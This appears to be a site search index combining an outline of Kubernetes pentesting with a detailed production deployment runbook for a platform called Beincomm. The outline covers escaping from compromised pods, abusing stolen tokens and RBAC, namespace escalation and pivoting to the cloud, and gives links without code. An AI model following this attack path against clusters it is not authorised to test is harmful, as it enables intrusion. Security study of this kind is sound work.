{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hack the Kubernetes with V\u0129 \u00b6 Kubernetes Basics \u00b6 If you don't know anything about Kubernetes this is a good start. Read it to learn about the architecture, components and basic actions in Kubernetes: Kubernetes Basics Pentesting Kubernetes \u00b6 From the Outside \u00b6 There are several possible Kubernetes services that you could find exposed on the Internet (or inside internal networks). If you find them you know there is Kubernetes environment in there. Depending on the configuration and your privileges you might be able to abuse that environment, for more information: Pentesting Kubernetes Services Enumeration inside a Pod \u00b6 If you manage to compromise a Pod read the following page to learn how to enumerate and try to escalate privileges/escape: Attacking Kubernetes from inside a Pod Enumerating Kubernetes with Credentials \u00b6 You might have managed to compromise user credentials, a user token or some service account token. You can use it to talk to the Kubernetes API service and try to enumerate it to learn more about it: Kubernetes Enumeration Another important details about enumeration and Kubernetes permissions abuse is the Kubernetes Role-Based Access Control (RBAC). If you want to abuse permissions, you first should read about it here: Kubernetes Role-Based Access Control (RBAC) Knowing about RBAC and having enumerated the environment you can now try to abuse the permissions with: Abusing Roles/ClusterRoles in Kubernetes Privesc to a different Namespace \u00b6 If you have compromised a namespace you can potentially escape to other namespaces with more interesting permissions/resources: Kubernetes Namespace Escalation From Kubernetes to the Cloud \u00b6 If you have compromised a K8s account or a pod, you might be able able to move to other clouds. This is because in clouds like AWS or GCP is possible to give a K8s SA permissions over the cloud. Kubernetes Access to other Clouds Kubernetes Hardening \u00b6 Kubernetes Hardening Kubernetes Network Attacks \u00b6 Kubernetes Network Attacks Labs to practice and learn \u00b6 https://securekubernetes.com/ https://madhuakula.com/kubernetes-goat/index.html","title":"Hack the Kubernetes with V\u0129"},{"location":"#hack-the-kubernetes-with-vi","text":"","title":"Hack the Kubernetes with V\u0129"},{"location":"#kubernetes-basics","text":"If you don't know anything about Kubernetes this is a good start. Read it to learn about the architecture, components and basic actions in Kubernetes: Kubernetes Basics","title":"Kubernetes Basics"},{"location":"#pentesting-kubernetes","text":"","title":"Pentesting Kubernetes"},{"location":"#from-the-outside","text":"There are several possible Kubernetes services that you could find exposed on the Internet (or inside internal networks). If you find them you know there is Kubernetes environment in there. Depending on the configuration and your privileges you might be able to abuse that environment, for more information: Pentesting Kubernetes Services","title":"From the Outside"},{"location":"#enumeration-inside-a-pod","text":"If you manage to compromise a Pod read the following page to learn how to enumerate and try to escalate privileges/escape: Attacking Kubernetes from inside a Pod","title":"Enumeration inside a Pod"},{"location":"#enumerating-kubernetes-with-credentials","text":"You might have managed to compromise user credentials, a user token or some service account token. You can use it to talk to the Kubernetes API service and try to enumerate it to learn more about it: Kubernetes Enumeration Another important details about enumeration and Kubernetes permissions abuse is the Kubernetes Role-Based Access Control (RBAC). If you want to abuse permissions, you first should read about it here: Kubernetes Role-Based Access Control (RBAC) Knowing about RBAC and having enumerated the environment you can now try to abuse the permissions with: Abusing Roles/ClusterRoles in Kubernetes","title":"Enumerating Kubernetes with Credentials"},{"location":"#privesc-to-a-different-namespace","text":"If you have compromised a namespace you can potentially escape to other namespaces with more interesting permissions/resources: Kubernetes Namespace Escalation","title":"Privesc to a different Namespace"},{"location":"#from-kubernetes-to-the-cloud","text":"If you have compromised a K8s account or a pod, you might be able able to move to other clouds. This is because in clouds like AWS or GCP is possible to give a K8s SA permissions over the cloud. Kubernetes Access to other Clouds","title":"From Kubernetes to the Cloud"},{"location":"#kubernetes-hardening","text":"Kubernetes Hardening","title":"Kubernetes Hardening"},{"location":"#kubernetes-network-attacks","text":"Kubernetes Network Attacks","title":"Kubernetes Network Attacks"},{"location":"#labs-to-practice-and-learn","text":"https://securekubernetes.com/ https://madhuakula.com/kubernetes-goat/index.html","title":"Labs to practice and learn"},{"location":"tags/","text":"Tags \u00b6 Following is a list of relevant tags: ArgoCD \u00b6 ArgoCD Bitbucket \u00b6 Bitbucket Tools \u00b6 DevOps Tools List antipattern \u00b6 Devops kubernetes deployment antipatterns aws \u00b6 Secure aws circleci \u00b6 Secure circleci cloud \u00b6 Secure aws Secure circleci Secure github Secure jenkins deployment \u00b6 Devops kubernetes deployment antipatterns docker \u00b6 Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts github \u00b6 Secure github jenkins \u00b6 Secure jenkins k8s \u00b6 Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes kubernetes \u00b6 Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes linux \u00b6 Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts Checklist linux privilege escalation Ddexec Linux capabilities Linux environment variables Useful linux commands microservices \u00b6 Istio Service Mesh monoliths \u00b6 Istio Service Mesh network \u00b6 44134 pentesting tiller helm pentesting \u00b6 44134 pentesting tiller helm service mesh \u00b6 Istio Service Mesh task \u00b6 Production Deployment","title":"Tags"},{"location":"tags/#tags","text":"Following is a list of relevant tags:","title":"Tags"},{"location":"tags/#argocd","text":"ArgoCD","title":"ArgoCD"},{"location":"tags/#bitbucket","text":"Bitbucket","title":"Bitbucket"},{"location":"tags/#tools","text":"DevOps Tools List","title":"Tools"},{"location":"tags/#antipattern","text":"Devops kubernetes deployment antipatterns","title":"antipattern"},{"location":"tags/#aws","text":"Secure aws","title":"aws"},{"location":"tags/#circleci","text":"Secure circleci","title":"circleci"},{"location":"tags/#cloud","text":"Secure aws Secure circleci Secure github Secure jenkins","title":"cloud"},{"location":"tags/#deployment","text":"Devops kubernetes deployment antipatterns","title":"deployment"},{"location":"tags/#docker","text":"Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts","title":"docker"},{"location":"tags/#github","text":"Secure github","title":"github"},{"location":"tags/#jenkins","text":"Secure jenkins","title":"jenkins"},{"location":"tags/#k8s","text":"Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes","title":"k8s"},{"location":"tags/#kubernetes","text":"Devops kubernetes deployment antipatterns Devops kubernetes Abusing roles clusterroles in kubernetes Attacking kubernetes from inside a pod Exposing services in kubernetes Kubernetes access to other clouds Kubernetes enumeration Kubernetes namespace escalation Kubernetes network attacks Kubernetes role based access control Pentesting kubernetes services Secure kubernetes","title":"kubernetes"},{"location":"tags/#linux","text":"Abusing docker socket for privilege escalation Apparmor Authz authn docker access authorization plugin Docker privileged Docker release agent cgroups escape Namespaces Release agent exploit relative paths to pids Seccomp Sensitive mounts Checklist linux privilege escalation Ddexec Linux capabilities Linux environment variables Useful linux commands","title":"linux"},{"location":"tags/#microservices","text":"Istio Service Mesh","title":"microservices"},{"location":"tags/#monoliths","text":"Istio Service Mesh","title":"monoliths"},{"location":"tags/#network","text":"44134 pentesting tiller helm","title":"network"},{"location":"tags/#pentesting","text":"44134 pentesting tiller helm","title":"pentesting"},{"location":"tags/#service-mesh","text":"Istio Service Mesh","title":"service mesh"},{"location":"tags/#task","text":"Production Deployment","title":"task"},{"location":"content/en/docs/bic/production_in_may2020/","tags":["task"],"text":"Production Deployment \u00b6 This page shows how to deploy the Beincomm in production environment. Before you begin \u00b6 You need to have: A managed Kubernetes cluster for backend services managed Kubernetes cluster for Kafka cluster. A managed PostgeSQL and Redis database. Accessible to ALL the related source codes, CircleCI, AWS environment, 3 rd party software such as SendGrid, Sentry, NewRelic,... Accessible to DevOps configuration files repository kubectl, aws, doppler command-line tool Pre-requisites \u00b6 Clone the configuration files and move to the cloned folder git clone git@github.com:bicdevops/production-may-2022.git cd production-may-2022 The output is similar to this: cd production-may-2022 Cloning into 'production-may-2022' ... remote: Enumerating objects: 2987 , done . remote: Total 2987 ( delta 0 ) , reused 0 ( delta 0 ) , pack-reused 2987 Receiving objects: 100 % ( 2987 /2987 ) , 45 .98 MiB | 6 .36 MiB/s, done . Resolving deltas: 100 % ( 1085 /1085 ) , done . Updating files: 100 % ( 3381 /3381 ) , done . Pre-deployment \u00b6 Clean up unnecessary Kubernetes resources \u00b6 Delete Bein Feed deployment and service in Kubernetes cluster kubectl delete deployment bein-feed-backend-api kubectl delete service bein-feed-backend-api The output is similar to this: deployment.apps \"bein-feed-backend-api\" deleted service \"bein-feed-backend-api\" deleted Delete Bein Mattermost deployment and service in Kubernetes cluster kubectl delete deployment bein-mattermost-backend-api kubectl delete service bein-mattermost-backend-api The output is similar to this: deployment.apps \"bein-mattermost-backend-api\" deleted service \"bein-mattermost-backend-api\" deleted Clean up all data on Redis \u00b6 Follow the best practice to clean up data Clean up all data on AWS Cognito \u00b6 Follow the best practice to clean up data Clean up all data on ElasticSearch \u00b6 Follow the best practice to clean up data Create Doppler secrets \u00b6 Install Doppler CLI and login to Doppler via website ./doppler/doppler_1_install_cli_and_login.sh Info \"Information when using doppler login \" Overwrite global login (/) / Open the authorization page in your browser? (Y/n) Y Paste the auth code into the Doppler website Choose BIC Workplace The output is similar to this: Warning: gnupg 2 .3.6 is already installed, it 's just not linked. To link this version, run: brew link gnupg Warning: dopplerhq/cli/doppler 3.40.0 is already installed, it' s just not linked. To link this version, run: brew link doppler Warning: You have already logged in . Would you like to scope your new login to the current directory, or overwrite the existing global login? ? Select an option: Scope login to current directory ( /Users/vi/BICDevOps/production-may-2022 ) Overwrite global login ( / ) / ? Open the authorization page in your browser? Yes Complete authorization at https://dashboard.doppler.com/workplace/auth/cli Your auth code is: *********_elderberry_stegosaurus_chili_cinnamon Waiting... Welcome, Nh\u00e2m Install Doppler Kubernetes Operator with manifest file ./doppler/doppler_2_install_kubernetes_operator.sh The output is similar to this: namespace/bic-doppler-operator-system created customresourcedefinition.apiextensions.k8s.io/dopplersecrets.secrets.doppler.com created serviceaccount/doppler-operator-controller-manager created role.rbac.authorization.k8s.io/doppler-operator-leader-election-role created clusterrole.rbac.authorization.k8s.io/doppler-operator-manager-role created clusterrole.rbac.authorization.k8s.io/doppler-operator-metrics-reader created clusterrole.rbac.authorization.k8s.io/doppler-operator-proxy-role created rolebinding.rbac.authorization.k8s.io/doppler-operator-leader-election-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/doppler-operator-manager-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/doppler-operator-proxy-rolebinding created configmap/doppler-operator-manager-config created service/doppler-operator-controller-manager-metrics-service created deployment.apps/doppler-operator-controller-manager created Create Doppler secrets - this will create all secrets to connect to Doppler ./doppler/doppler_3_setup_secrets.sh The output is similar to this: secret/bic-chat-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-chat-pro-doppler-secret created secret/bic-comm-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-comm-pro-doppler-secret created secret/bic-stream-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-stream-pro-doppler-secret created secret/bic-notification-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-notification-pro-doppler-secret created secret/bic-upload-kaltura-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-upload-kaltura-pro-doppler-secret created secret/bic-upload-manage-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-upload-manage-pro-doppler-secret created Create self-host Kafka Kubernetes cluster in DigitalOcean \u00b6 Create Kubernetes cluster name: bein-pro-sgp1-k8s-kafka-cluster With node pool and capacities Node pool Capacity # of node kafka-pro-basic40-pool 4vCPU, 8GB RAM 1 kafka-pro-10-pool 1vCPU, 2GB RAM 2 Create Kafka Kubernetes cluster ./kafka/kafka_1_nodeport_cluster_SCRAM.sh The output is similar to this: namespace/kafka created % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 751k 100 751k 0 0 334k 0 0 :00:02 0 :00:02 --:--:-- 2231k customresourcedefinition.apiextensions.k8s.io/strimzipodsets.core.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkausers.kafka.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkas.kafka.strimzi.io created clusterrole.rbac.authorization.k8s.io/strimzi-cluster-operator-namespaced created clusterrole.rbac.authorization.k8s.io/strimzi-kafka-broker created customresourcedefinition.apiextensions.k8s.io/kafkaconnects.kafka.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkaconnectors.kafka.strimzi.io created deployment.apps/strimzi-cluster-operator created customresourcedefinition.apiextensions.k8s.io/kafkarebalances.kafka.strimzi.io created rolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator created clusterrole.rbac.authorization.k8s.io/strimzi-cluster-operator-global created customresourcedefinition.apiextensions.k8s.io/kafkabridges.kafka.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkamirrormaker2s.kafka.strimzi.io created rolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator-entity-operator-delegation created clusterrole.rbac.authorization.k8s.io/strimzi-kafka-client created clusterrolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator-kafka-client-delegation created clusterrolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator created customresourcedefinition.apiextensions.k8s.io/kafkatopics.kafka.strimzi.io created clusterrolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator-kafka-broker-delegation created configmap/strimzi-cluster-operator created clusterrole.rbac.authorization.k8s.io/strimzi-entity-operator created customresourcedefinition.apiextensions.k8s.io/kafkamirrormakers.kafka.strimzi.io created serviceaccount/strimzi-cluster-operator created kafka.kafka.strimzi.io/my-cluster created kafkatopic.kafka.strimzi.io/my-topic created secret/bic-comm-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-comm-pro-kafka-user created secret/bic-chat-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-chat-pro-kafka-user created secret/bic-stream-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-stream-pro-kafka-user created secret/bic-notification-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-notification-pro-kafka-user created secret/kafka-test-secret created kafkauser.kafka.strimzi.io/kafka-test created NAME READY STATUS RESTARTS AGE strimzi-cluster-operator-585f6fd9d7-8vm59 0 /1 ContainerCreating 0 8s strimzi-cluster-operator-585f6fd9d7-8vm59 0 /1 Running 0 17s strimzi-cluster-operator-585f6fd9d7-8vm59 1 /1 Running 0 31s my-cluster-zookeeper-0 0 /1 Pending 0 0s my-cluster-zookeeper-1 0 /1 Pending 0 0s my-cluster-zookeeper-0 0 /1 Pending 0 0s my-cluster-zookeeper-1 0 /1 Pending 0 0s my-cluster-zookeeper-2 0 /1 Pending 0 0s my-cluster-zookeeper-2 0 /1 Pending 0 0s my-cluster-zookeeper-1 0 /1 Pending 0 4s my-cluster-zookeeper-1 0 /1 ContainerCreating 0 4s my-cluster-zookeeper-0 0 /1 Pending 0 8s my-cluster-zookeeper-2 0 /1 Pending 0 8s my-cluster-zookeeper-0 0 /1 ContainerCreating 0 8s my-cluster-zookeeper-2 0 /1 ContainerCreating 0 8s my-cluster-zookeeper-1 0 /1 Running 0 29s my-cluster-zookeeper-2 0 /1 Running 0 29s my-cluster-zookeeper-0 0 /1 Running 0 30s my-cluster-zookeeper-1 1 /1 Running 0 45s my-cluster-zookeeper-0 1 /1 Running 0 49s my-cluster-zookeeper-2 1 /1 Running 0 49s my-cluster-kafka-0 0 /1 Pending 0 0s my-cluster-kafka-1 0 /1 Pending 0 0s my-cluster-kafka-0 0 /1 Pending 0 0s my-cluster-kafka-2 0 /1 Pending 0 0s my-cluster-kafka-1 0 /1 Pending 0 0s my-cluster-kafka-2 0 /1 Pending 0 0s my-cluster-kafka-0 0 /1 Pending 0 4s my-cluster-kafka-2 0 /1 Pending 0 4s my-cluster-kafka-0 0 /1 Init:0/1 0 4s my-cluster-kafka-2 0 /1 Init:0/1 0 4s my-cluster-kafka-1 0 /1 Pending 0 8s my-cluster-kafka-1 0 /1 Init:0/1 0 8s my-cluster-kafka-2 0 /1 Init:0/1 0 18s my-cluster-kafka-2 0 /1 PodInitializing 0 21s my-cluster-kafka-2 0 /1 Running 0 22s my-cluster-kafka-0 0 /1 Init:0/1 0 26s my-cluster-kafka-1 0 /1 Init:0/1 0 29s my-cluster-kafka-0 0 /1 PodInitializing 0 34s my-cluster-kafka-0 0 /1 Running 0 35s my-cluster-kafka-1 0 /1 PodInitializing 0 39s my-cluster-kafka-1 0 /1 Running 0 40s my-cluster-kafka-2 1 /1 Running 0 55s my-cluster-kafka-1 1 /1 Running 0 68s my-cluster-kafka-0 1 /1 Running 0 75s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 Pending 0 0s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 Pending 0 0s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 ContainerCreating 0 0s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 Running 0 18s my-cluster-entity-operator-58f4844c45-nqdxs 1 /3 Running 0 22s my-cluster-entity-operator-58f4844c45-nqdxs 1 /3 Running 0 22s my-cluster-entity-operator-58f4844c45-nqdxs 2 /3 Running 0 40s my-cluster-entity-operator-58f4844c45-nqdxs 3 /3 Running 0 50s Export all client certificates and scram credentials cd kafka ./kafka_2_export_certificates.sh ls -la The output is similar to this: total 152 drwxr-xr-x 20 vi staff 640 Jun 7 09 :34 . drwxr-xr-x 49 vi staff 1568 Jun 7 14 :14 .. -rw-r--r-- 1 vi staff 152 Jun 7 14 :18 bic-chat-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-chat-pro-kafka-user.password -rw-r--r-- 1 vi staff 152 Jun 7 14 :18 bic-comm-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-comm-pro-kafka-user.password -rw-r--r-- 1 vi staff 160 Jun 7 14 :18 bic-notification-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-notification-pro-kafka-user.password -rw-r--r-- 1 vi staff 154 Jun 7 14 :18 bic-stream-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-stream-pro-kafka-user.password -rw-r--r-- 1 vi staff 1854 Jun 7 14 :18 ca.crt -rw-r--r-- 1 vi staff 1687 Jun 7 14 :18 ca.p12 -rw-r--r-- 1 vi staff 12 Jun 7 14 :18 ca.password -rw-r--r-- 1 vi staff 1854 Jun 7 14 :18 client-cert.pem -rw-r--r-- 1 vi staff 3272 Jun 7 14 :18 client-key.pem -rw-r--r-- 1 vi staff 1441 Jun 7 09 :34 docker-compose.yml -rw-r--r-- 1 vi staff 107 Jun 7 14 :18 kafka-test.config -rw-r--r-- 1 vi staff 8 Jun 7 14 :18 kafka-test.password -rwxr-xr-x 1 vi staff 5099 Jun 7 09 :34 kafka_1_nodeport_cluster_SCRAM.sh -rwxr-xr-x 1 vi staff 3078 Jun 7 09 :34 kafka_2_export_certificates.sh Create NewRelic API key and Fluentd on Kubernetes cluster \u00b6 Create NewRelic API key \u00b6 Access https://one.newrelic.com/launcher/api-keys-ui.api-keys-launcher Create a key Choose Key type : Ingest - License Name : k8s log Click Create a key Create base64 encoded format for the newly generated API key and update the data.LICENSE_KEY in the secret object in newrelic_1_install_fluentd_components.sh script Encode base64 the license key above echo -n 'content-of-the-new-API-key' | base64 Y29udGVudC1vZi10aGUtbmV3LUFQSS1rZXk = Insert the base64 encoded output to the data.LICENCE_KEY cat <<EOF | kubectl apply -f - apiVersion: v1 kind: Secret metadata: name: fluentd-aggregation namespace: kube-system data: BASE_URI: # content hide LICENSE_KEY: Y29udGVudC1vZi10aGUtbmV3LUFQSS1rZXk= # <== paste here EOF The output is similar to this: secret/fluentd-aggregation created Install Fluentd on Kubernetes cluster \u00b6 Switch to Production Kubernetes cluster kubectl config use-context do -k8s-production The output is similar to this: Switched to context \"do-k8s-production\" . Install Fluentd aggregation ./newrelic/newrelic_1_install_fluentd_components.sh The output is similar to this: daemonset.apps/fluentd-agent created clusterrole.rbac.authorization.k8s.io/fluentd created clusterrolebinding.rbac.authorization.k8s.io/fluentd created configmap/fluentd-aggregation-config created deployment.apps/fluentd-aggregation created secret/fluentd-aggregation configured service/fluentd-aggregation created serviceaccount/fluentd created Update the Ingress log format ./newrelic/newrelic_2_update_ingress_log_format.sh The output is similar to this: configmap/ingress-nginx-controller created Create SendGrid API key and verify sender email \u00b6 Bein Chat Deployment \u00b6 Drop Postgres all tables \u00b6 Deploy Chat backend and Chat frontend in Kubernetes cluster \u00b6 Switch to Production Kubernetes cluster kubectl config use-context do -k8s-production The output is similar to this: Switched to context \"do-k8s-production\" . Create PVCs for Chat ./chat/chat_1_create_pvc.sh The output is similar to this: persistentvolumeclaim/do-vol-mattermost-data-pvc created persistentvolumeclaim/do-vol-mattermost-plugins-pvc created persistentvolumeclaim/do-vol-mattermost-client-plugins-pvc created persistentvolumeclaim/do-vol-mattermost-config-pvc created Deploy CI/CD job to branch master for bein-mattermost-server and bein-chat-web source code Upload the updated config.json file to newly deployed Chat server ./chat/chat_2_copy_config_file.sh Restart the Chat server by delete the running Pod (example name bein-mattermost-7b67589799-kihj5 ) kubectl rollout restart deployment bein-mattermost The output is similar to this: deployment.apps/bein-mattermost restarted Verify the new Chat server Pod is in Running state kubectl get pod The output is similar to this: NAME READY STATUS RESTARTS AGE bein-mattermost-674db8c96d-twcl5 0 /1 Terminating 0 4h19m bein-mattermost-7bbbb64d64-b7t82 1 /1 Running 0 12s Create Chat System Admin \u00b6 Follow the instruction below: https://app.clickup.com/3649385/v/dc/3fbv9-16924/3fbv9-21065 Upload Chat plugins \u00b6 Follow the instruction below: https://app.clickup.com/3649385/v/dc/3fbv9-16924/3fbv9-24907 Setup SendGrid email on Chat \u00b6 Setup Push Notification Proxy on Kubernetes cluster \u00b6 Install Push Notification Proxy ./chat/chat_3_install_push_notification_proxy.sh The output is similar to this: configmap/mattermost-push-noti-configmap created service/bein-mattermost-push-noti-proxy created deployment.apps/bein-mattermost-push-noti-proxy created https://app.clickup.com/3649385/v/dc/3fbv9-16924/3fbv9-20125 Deploy Chat app \u00b6 Bein Comm Deployment \u00b6 Truncate old Postgres data \u00b6 Deploy Comm backend \u00b6 Update environment variables of bic-comm Production environment on Doppler Merge code of bein-backend repository from staging to master branch Deploy Comm web \u00b6 Deploy Comm app \u00b6 Deploy Comm web staff \u00b6 Bein Stream Deployment \u00b6 Deploy Stream backend \u00b6 Update environment variables of bic-stream Production environment on Doppler Merge code of bein-stream repository from staging to master branch Create bein_stream schema in Postgres \u00b6 Create bein_stream schema Bein Notification Deployment \u00b6 Deploy Notification backend \u00b6 Update environment variables of bic-stream Production environment on Doppler Merge code of bein-stream repository from staging to master branch Create bein_notification schema in Postgres \u00b6 Create bein_notification schema Post-deployment \u00b6 Update Ingress Controller resources in Kubernetes cluster \u00b6 Update Ingress Controller resources ./nginx-ingress/ingress_1_update_ingress.sh The output is similar to this: ingress.networking.k8s.io/bein-group-ingress configured Create Super Admin and BIC Team accounts \u00b6 Create Communities and Groups \u00b6 Bein Upload Deployment \u00b6 Bein Upload Kaltura Deployment \u00b6 Update environment variables of bic-upload-kaltura Production environment on Doppler Merge code of bein-upload-kaltura repository from staging to master branch Bein Upload Manage Deployment \u00b6 Update environment variables of bic-upload-manage Production environment on Doppler Merge code of bein-upload-manage repository from staging to master branch API Gateway (APISIX) \u00b6 Create APISIX and APISIX Ingress Controller ./apisix/apisix_1_install_apisix_and_ingress_controller.sh The output is similar to this: Hang tight while we grab the latest from your chart repositories... ...Successfully got an update from the \"apisix\" chart repository Update Complete. \u2388Happy Helming!\u2388 NAME: apisix LAST DEPLOYED: Thu Jun 23 15 :49:53 2022 NAMESPACE: ingress-apisix STATUS: deployed REVISION: 1 TEST SUITE: None NOTES: 1 . Get the application URL by running these commands: NOTE: It may take a few minutes for the LoadBalancer IP to be available. You can watch the status of by running 'kubectl get --namespace ingress-apisix svc -w apisix-gateway' export SERVICE_IP = $( kubectl get svc --namespace ingress-apisix apisix-gateway --template \"{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\" ) echo http:// $SERVICE_IP :80 Create APISIX-Dashboard ./apisix/apisix_2_install_apisix_dashboard.sh The output is similar to this: Hang tight while we grab the latest from your chart repositories... ...Successfully got an update from the \"apisix\" chart repository Update Complete. \u2388Happy Helming!\u2388 NAME: apisix-dashboard LAST DEPLOYED: Thu Jun 23 15 :50:15 2022 NAMESPACE: ingress-apisix STATUS: deployed REVISION: 1 NOTES: 1 . Get the application URL by running these commands: export POD_NAME = $( kubectl get pods --namespace ingress-apisix -l \"app.kubernetes.io/name=apisix-dashboard,app.kubernetes.io/instance=apisix-dashboard\" -o jsonpath = \"{.items[0].metadata.name}\" ) export CONTAINER_PORT = $( kubectl get pod --namespace ingress-apisix $POD_NAME -o jsonpath = \"{.spec.containers[0].ports[0].containerPort}\" ) echo \"Visit http://127.0.0.1:8080 to use your application\" kubectl --namespace ingress-apisix port-forward $POD_NAME 8080 : $CONTAINER_PORT Update APISIX configuration to include the cognito-auth plugin ./apisix/apisix_3_update_apisix_config.sh Update APISIX-Dashboard configuration to include the cognito-auth plugin ./apisix/apisix_4_update_apisix_dashboard_config.sh Create APISIX routess by APISIX ingress resource ./apisix/apisix_5_create_apisix_routes_by_ingress_controller.sh The output is similar to this: ingress.networking.k8s.io/bic-apisix-ingress created To create an IAM OIDC identity provider for your cluster with the AWS Management Console Open the Amazon EKS console at https://console.aws.amazon.com/eks/home#/clusters. Select the name of your cluster. In the Details section on the Overview tab, note the value of the OpenID Connect provider URL. Open the IAM console at https://console.aws.amazon.com/iam/. In the left navigation pane, choose Identity Providers under Access management. If a Provider is listed that matches the URL for your cluster, then you already have a provider for your cluster. If a provider isn't listed that matches the URL for your cluster, then you must create one. To create a provider, choose Add Provider. For Provider Type, choose OpenID Connect. For Provider URL, paste the OIDC issuer URL for your cluster, and then choose Get thumbprint. For Audience, enter sts.amazonaws.com and choose Add provider.","title":"Production Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#production-deployment","text":"This page shows how to deploy the Beincomm in production environment.","title":"Production Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#before-you-begin","text":"You need to have: A managed Kubernetes cluster for backend services managed Kubernetes cluster for Kafka cluster. A managed PostgeSQL and Redis database. Accessible to ALL the related source codes, CircleCI, AWS environment, 3 rd party software such as SendGrid, Sentry, NewRelic,... Accessible to DevOps configuration files repository kubectl, aws, doppler command-line tool","title":"Before you begin"},{"location":"content/en/docs/bic/production_in_may2020/#pre-requisites","text":"Clone the configuration files and move to the cloned folder git clone git@github.com:bicdevops/production-may-2022.git cd production-may-2022 The output is similar to this: cd production-may-2022 Cloning into 'production-may-2022' ... remote: Enumerating objects: 2987 , done . remote: Total 2987 ( delta 0 ) , reused 0 ( delta 0 ) , pack-reused 2987 Receiving objects: 100 % ( 2987 /2987 ) , 45 .98 MiB | 6 .36 MiB/s, done . Resolving deltas: 100 % ( 1085 /1085 ) , done . Updating files: 100 % ( 3381 /3381 ) , done .","title":"Pre-requisites"},{"location":"content/en/docs/bic/production_in_may2020/#pre-deployment","text":"","title":"Pre-deployment"},{"location":"content/en/docs/bic/production_in_may2020/#clean-up-unnecessary-kubernetes-resources","text":"Delete Bein Feed deployment and service in Kubernetes cluster kubectl delete deployment bein-feed-backend-api kubectl delete service bein-feed-backend-api The output is similar to this: deployment.apps \"bein-feed-backend-api\" deleted service \"bein-feed-backend-api\" deleted Delete Bein Mattermost deployment and service in Kubernetes cluster kubectl delete deployment bein-mattermost-backend-api kubectl delete service bein-mattermost-backend-api The output is similar to this: deployment.apps \"bein-mattermost-backend-api\" deleted service \"bein-mattermost-backend-api\" deleted","title":"Clean up unnecessary Kubernetes resources"},{"location":"content/en/docs/bic/production_in_may2020/#clean-up-all-data-on-redis","text":"Follow the best practice to clean up data","title":"Clean up all data on Redis"},{"location":"content/en/docs/bic/production_in_may2020/#clean-up-all-data-on-aws-cognito","text":"Follow the best practice to clean up data","title":"Clean up all data on AWS Cognito"},{"location":"content/en/docs/bic/production_in_may2020/#clean-up-all-data-on-elasticsearch","text":"Follow the best practice to clean up data","title":"Clean up all data on ElasticSearch"},{"location":"content/en/docs/bic/production_in_may2020/#create-doppler-secrets","text":"Install Doppler CLI and login to Doppler via website ./doppler/doppler_1_install_cli_and_login.sh Info \"Information when using doppler login \" Overwrite global login (/) / Open the authorization page in your browser? (Y/n) Y Paste the auth code into the Doppler website Choose BIC Workplace The output is similar to this: Warning: gnupg 2 .3.6 is already installed, it 's just not linked. To link this version, run: brew link gnupg Warning: dopplerhq/cli/doppler 3.40.0 is already installed, it' s just not linked. To link this version, run: brew link doppler Warning: You have already logged in . Would you like to scope your new login to the current directory, or overwrite the existing global login? ? Select an option: Scope login to current directory ( /Users/vi/BICDevOps/production-may-2022 ) Overwrite global login ( / ) / ? Open the authorization page in your browser? Yes Complete authorization at https://dashboard.doppler.com/workplace/auth/cli Your auth code is: *********_elderberry_stegosaurus_chili_cinnamon Waiting... Welcome, Nh\u00e2m Install Doppler Kubernetes Operator with manifest file 